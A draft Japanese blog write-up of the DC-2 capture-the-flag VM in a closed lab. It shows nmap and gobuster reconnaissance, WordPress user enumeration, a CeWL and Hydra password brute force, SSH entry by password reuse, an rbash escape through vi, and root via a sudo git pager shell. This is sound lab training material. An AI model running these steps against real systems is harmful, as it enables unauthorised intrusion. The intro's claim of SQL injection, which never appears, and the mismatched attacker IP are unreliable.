---
title: "仮"
emoji: "💻"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: []
published: false
---

## はじめに
こんにちは、雨水と申します。

今回は、仮想環境上のやられサーバーに対してSQLインジェクション攻撃を行い、root権限を奪取するまでの過程を記録します。

このような仮想環境で攻撃実験を行った記事をこのほかにも書いていますので、宜しければ合わせてご覧ください。
前回記事：https://zenn.dev/rw_sec/articles/2db6e6b3bdf51d

:::message alert
本記事は、自身の管理下にある閉じた仮想ネットワーク内での実験記録です。
許可のない第三者のサーバーやネットワークに対して同様の行為を行うことは、不正アクセス禁止法により処罰の対象となります。絶対に悪用しないでください。
:::

## 環境構成
今回の実験環境は以下の通りです。

* **ホストOS:** Windows 11
* **仮想化ソフト:** Oracle VM VirtualBox 7.0
* **攻撃機:** Parrot Security OS 5.3 (IP: 192.168.56.100)
* **ターゲット:** DC-2(仮想マシン) 
* **ネットワーク:** NATネットワーク（外部から隔離）

## 用いた主要なツール
* **nmap**
* **wireshark**
* **Hydra**
* **wig**
* **CeWL**

## 攻撃のステップ

### 1. 偵察

まず、`ip a`を用いて自身のIPアドレスを特定したのちに、Linuxのコマンドを組み合わせてDC-2(ターゲット機)のIPアドレスを特定しました。

自身のIPアドレスが192.168.56.107なので、消去法でDC-2のIPアドレスが192.168.56.100か192.168.56.110であることが分かりました。
```bash
┌─[user@parrot]─[~]
└──╼ $ip -4 a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
       valid_lft 63384sec preferred_lft 63384sec
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 192.168.56.107/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s8
       valid_lft 575sec preferred_lft 575sec
```

```bash
┌─[user@parrot]─[~]
└──╼ $for ip in $(seq 1 254); do (ping -c 1 192.168.56.$ip 2> /dev/null | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &); done
192.168.56.100
192.168.56.107
192.168.56.110
```
2択にまで絞れたので、両方に対して`nmap`を行いDC-2の開いているポートを確認しました。

```bash
┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $sudo nmap -sC -sV 192.168.56.100 --open -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-25 22:03 JST
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $sudo nmap -sC -sV 192.168.56.110 --open -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-20 18:39 JST
Nmap scan report for 192.168.56.110
Host is up (0.0010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
MAC Address: 08:00:27:0B:F4:E8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.19 seconds
```
80番ポートと7744番ポートが開いていることが分かりました。7744番ポートはSSHサービスであるため、後々使えそうです。

次に、DC-2のWebサイトに直接アクセスし、攻撃を試みます。
しかし、hXXp://192.168.56.110にアクセスしても次のような画面が表示され、エラーが出てしまいます。

![alt text](/images/nmap/fail_to_show_toppage.png)

この原因は、

DC-2はWorPressで動作しており、これはIPアドレスではなくDC-2というドメインでアクセスされることを想定されています。
そのため、ブラウザからIPアドレスを直打ちしてアクセスすると内部で強制的に`http://dc-2/`にリダイレクトされることがあります。

しかし、本実験はローカルな環境で行っているため攻撃機がdc-2というドメインのIPアドレスを知らず、エラーが出てしまいました。

これを解決するためには、攻撃機のローカルな環境で独自に名前解決を行えるようにする必要があります。
具体的には、
```bash
sudo vi /etc/hosts
```
と`vi`コマンドを実行し、OSの`hosts`ファイルを編集して
```bash
192.168.56.110  dc-2
```
とターゲットのIPアドレスとドメイン名の紐付けを直接追記します。

設定完了後、ブラウザのアドレスバーに改めて`hXXp://192.168.56.110/`と入力してアクセスすると、無事にリダイレクトが行われ、ターゲットマシンのWordPressのトップページが表示されるようになります。
![alt text](/images/DC2_Toppage.png)

Webサイトを探索すると、"Flag 1"というページがあり、ヒントとして`CeWL`というツールを用いることが示唆されていました。

![alt text](/images/flag1.png)

Webサイトに入力欄が無かったので、`GoBuster`ツールを用いて隠されたディレクトリを探索します。

```bash
┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $gobuster dir -u http://192.168.56.110:80/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.110:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 298]
/.hta                 (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 298]
/index.php            (Status: 200) [Size: 53562]
/server-status        (Status: 403) [Size: 302]
/wp-admin             (Status: 301) [Size: 319] [--> http://192.168.56.110/wp-admin/]
/wp-includes          (Status: 301) [Size: 322] [--> http://192.168.56.110/wp-includes/]
/wp-content           (Status: 301) [Size: 321] [--> http://192.168.56.110/wp-content/]
Progress: 4614 / 4615 (99.98%)
/xmlrpc.php           (Status: 405) [Size: 42]
===============================================================
Finished
===============================================================
```

`wp-admin`,`wp-includes`,`wp-content`ディレクトリが発見できました。これはWordPressの典型的なディレクトリ構成です。

ブラウザで`hXXp://192.168.56.110/wp-admin/`にアクセスすると、ログイン画面が表示されました。

![alt text](/images/login.png)

ユーザーネームやパスワードが分からないので、`wig`というWordPressに対する解析ツールを用います。`wig`を用いることでバージョンを絞り込めます。

```bash
┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $wig $URL

wig - WebApp Information Gatherer


Scanning http://192.168.56.110:80/...
___________________________________________________ SITE INFO ____________________________________________________
IP               Title                                                                                            
Unknown          DC-2 &#8211; Just another WordPress site                                                       
                                                                                                                  
____________________________________________________ VERSION _____________________________________________________
Name             Versions                                                     Type                                
WordPress        3.8 | 3.8.1 | 3.8.2 | 3.8.3 | 3.8.4 | 3.8.5 | 3.8.6 | 3.8.7  CMS                                 
                 3.8.8 | 3.9 | 3.9.1 | 3.9.2 | 3.9.3 | 3.9.4 | 3.9.5 | 3.9.6                                      
                 4.0 | 4.0.1 | 4.0.2 | 4.0.3 | 4.0.4 | 4.0.5 | 4.1 | 4.1.1                                        
                 4.1.2 | 4.1.3 | 4.1.4 | 4.1.5 | 4.2 | 4.2.1 | 4.2.2                                              
Apache           2.4.10                                                       Platform                            
Debian           8.0                                                          OS                                  
                                                                                                                  
__________________________________________________ INTERESTING ___________________________________________________
URL              Note                                                         Type                                
/wp-login.php    Wordpress login page                                         Interesting                         
/readme.html     Readme file                                                  Interesting                         
                                                                                                                  
_____________________________________________________ TOOLS ______________________________________________________
Name             Link                                                         Software                            
wpscan           https://github.com/wpscanteam/wpscan                         WordPress                           
CMSmap           https://github.com/Dionach/CMSmap                            WordPress                           
                                                                                                                  
________________________________________________ VULNERABILITIES _________________________________________________
Affected         #Vulns                                                       Link                                
WordPress 3.8    12                                                           http://cvedetails.com/version/162922
WordPress 3.8.1  12                                                           http://cvedetails.com/version/162923
WordPress 3.8.2  7                                                            http://cvedetails.com/version/176067
WordPress 3.8.3  7                                                            http://cvedetails.com/version/176068
WordPress 3.8.4  8                                                            http://cvedetails.com/version/176069
WordPress 3.9    8                                                            http://cvedetails.com/version/176070
WordPress 3.9.1  15                                                           http://cvedetails.com/version/169908
WordPress 3.9.2  10                                                           http://cvedetails.com/version/176071
WordPress 3.9.3  1                                                            http://cvedetails.com/version/185080
WordPress 4.0    9                                                            http://cvedetails.com/version/176072
WordPress 4.0.1  1                                                            http://cvedetails.com/version/185081
WordPress 4.1    1                                                            http://cvedetails.com/version/185082
WordPress 4.1.1  2                                                            http://cvedetails.com/version/185079
WordPress 4.2    1                                                            http://cvedetails.com/version/185048
WordPress 4.2.1  0                                                            http://cvedetails.com/version/184019
WordPress 4.2.2  2                                                            http://cvedetails.com/version/185073
                                                                                                                  
__________________________________________________________________________________________________________________
Time: 6.4 sec    Urls: 387                                                    Fingerprints: 39241      

```
さらに情報を収集するために、`nmap`を再び用います。`NSE`という機能を用いることでユーザーネームを列挙できます。

```bash
┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $sudo nmap -p80 --script http-wordpress-users $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-21 14:30 JST
Nmap scan report for dc-2 (192.168.56.110)
Host is up (0.0017s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-users: 
| Username found: admin
| Username found: tom
| Username found: jerry
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
MAC Address: 08:00:27:0B:F4:E8 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds
```
`admin`,`jerry`.`tom`ユーザーが存在することが判明しました。


ここで、先ほどの`Flag 1`ページで`CeWL`を用いるヒントが示されていました。
`CeWL`で辞書ファイルを生成し、`Hydra`を用いてそれぞれのユーザーに対して攻撃を試みます。
ログインに失敗するとDC-2の画面上に"incorrect"と表示されていることが確認されたので、`Hydra`のコマンドにそれを含めました。
ここで、`dict.txt`は`cewl`で作成した辞書ファイル、`user.txt`はユーザーリストです。
```bash
┌─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $cewl -m 5 -w dict.txt http://dc-2
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)


┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $hydra -L users.txt -P dict.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect'
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 495 login tries (l:3/p:165), ~31 tries per task
[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect
[80][http-post-form] host: dc-2   login: jerry   password: adipiscing
[STATUS] 421.00 tries/min, 421 tries in 00:01h, 74 to do in 00:01h, 16 active
[80][http-post-form] host: dc-2   login: tom   password: parturient
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 14:26:18
```

`jerry`ユーザーと`tom`ユーザーのパスワードが判明しました。
実際にログインしてみると、以下のようなダッシュボードが表示されました。

![alt text](/images/tom.png)

しかし、ダッシュボードを確認するとメールアドレスなどの情報は入手できたものの、直接次の攻撃のステップにつながりそうな手掛かりは見つかりませんでした。
そこで、序盤の`nmap`で得たSSHポートが開いていたという情報を思い出し、ダッシュボードと同じパスワードが使い回されている可能性が高いと考え、侵入を試みました。

```bash
┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $ssh jerry@$IP -p 7744 
jerry@192.168.56.110's password: 
Permission denied, please try again.

┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
└──╼ $ssh tom@$IP -p 7744
tom@192.168.56.110's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ 
```

`jerry`ユーザーはパスワードが異なり侵入はできませんでしたが、`tom`ユーザーで無事侵入ができました。

現在の自身の状況を確認します。

```bash
tom@DC-2:~$ whoami
-rbash: whoami: command not found
tom@DC-2:~$ id
-rbash: id: command not found

tom@DC-2:~$ pwd
/home/tom
tom@DC-2:~$ ls -la
total 40
drwxr-x--- 3 tom  tom  4096 Mar 21  2019 .
drwxr-xr-x 4 root root 4096 Mar 21  2019 ..
-rwxr-x--- 1 tom  tom    66 Mar 21  2019 .bash_history
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc
-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile
drwxr-x--- 3 tom  tom  4096 Mar 21  2019 usr

tom@DC-2:~$ cat flag3.txt
-rbash: cat: command not found
```
`flag3.txt`の存在は確認できましたが、`whoami`や`id`、`cat`といった基本的なコマンドを使うことに制限がかかっている状況です。

現在何のコマンドが使えるのか確認します。
```bash
tom@DC-2:~$ ls /home/tom/usr/bin
less  ls  scp  vi
```
`vi`コマンドが使えることが分かったので、これで`flag3.txt`の中身を覗きました。
```bash
Poor old Tom is always running after Jerry. 
Perhaps he should su for all the stress he causes.
```

言葉遊びで`su`コマンドを用いることが示唆されていました。
`su`を用いることで`tom`から`jerry`へとユーザーを切り替えることが可能ですが、現在の制限された環境下では`su`コマンドを実行することができません。

そこで、実行が許可されている`vi`エディタの機能を用いて、この制限付きシェル（rbash）からの脱出を試みます。

まず、現在の状態を確認します。
```bash
tom@DC-2:~$ echo $SHELL
/bin/rbash
tom@DC-2:~$ echo $0
-rbash
```

ここから`vi`を用いて内部設定のシェルを書き換えます。
コマンドモードで`:set shell=/bin/bash`と入力し、さら`:shell`を実行して、設定した通常のbashシェルを直接起動します。

これは、`vi`エディタ自体の実行が許可されていることを逆手に取り、`vi`の内部から直接通常のシェルを呼び出すことで、`rbash`のコマンド入力制限をすり抜けるという手法です。

しかし、シェルが新しくなっても、コマンドの探索パス（環境変数 $PATH）は依然としてrbashの制限された状態を引き継いでしまっています。そのため、脱出後すぐに以下のコマンドを実行して、本来のパス設定を取り戻します。
```bash
tom@DC-2:~$ export PATH=/bin:/usr/bin:/sbin:/usr/sbin:$PATH
```
これにより、すべての基本コマンドが解放され、ようやく`su`コマンドを用いた`jerry`への切り替えが可能になります。

tom@DC-2:~$ su jerry
Password: 

jerry@DC-2:/home/tom$ ls -la
ls: cannot open directory .: Permission denied
jerry@DC-2:/home/tom$ whoami
jerry
jerry@DC-2:/home/tom$ id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)
jerry@DC-2:/home/tom$ cd

jerry@DC-2:~$ ls -la
total 28
drwxr-xr-x 2 jerry jerry 4096 Mar 21  2019 .
drwxr-xr-x 4 root  root  4096 Mar 21  2019 ..
-rw------- 1 jerry jerry  109 Mar 21  2019 .bash_history
-rw-r--r-- 1 jerry jerry  220 Mar 21  2019 .bash_logout
-rw-r--r-- 1 jerry jerry 3515 Mar 21  2019 .bashrc
-rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt
-rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile
jerry@DC-2:~$ cat flag4.txt
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!

jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

jerry@DC-2:~$ sudo git -p help config

       Multiple lines can be added to an option by using the --add
       option. If you want to update or unset an option which can occur
       on multiple lines, a POSIX regexp value_regex needs to be given.
       Only the existing values that match the regexp are updated or
       unset. If you want to handle the lines that do not match the
!/bin/bash
root@DC-2:/home/jerry# 
root@DC-2:/home/jerry# whoami
root
root@DC-2:/home/jerry# id
uid=0(root) gid=0(root) groups=0(root)
root@DC-2:/home/jerry# cd /root
root@DC-2:~# ls -la
total 32
drwx------  2 root root 4096 Mar 21  2019 .
drwxr-xr-x 21 root root 4096 Mar 10  2019 ..
-rw-------  1 root root  207 Mar 21  2019 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  427 Mar 21  2019 final-flag.txt
-rw-------  1 root root   46 Mar 21  2019 .lesshst
-rw-------  1 root root  232 Mar 21  2019 .mysql_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
root@DC-2:~# cat final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.